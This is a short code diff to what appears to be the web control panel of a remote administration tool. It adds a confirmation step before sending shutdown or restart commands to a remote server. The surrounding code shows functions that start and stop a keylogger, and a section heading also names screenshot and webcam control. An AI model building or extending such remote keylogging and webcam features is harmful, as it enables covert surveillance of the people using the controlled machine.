@@ -415,6 +415,17 @@ function createBtn(text, className, onClick) {
     return btn;
 }
 
+// Shutdown and Restart
+function confirmAction(action) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        if (confirm("Are you sure you want to " + action.toUpperCase() + " the remote server?")) {
+            sendCommand(action);
+        }
+    } else {
+        alert("Chưa kết nối!");
+    }
+}
+
 // --- LOGIC KEYLOGGER, SCREENSHOT, WEBCAM ---
 function startkeyLog() { sendCommand("start_keylog"); }
 function stopkeyLog() { sendCommand("stop_keylog"); }
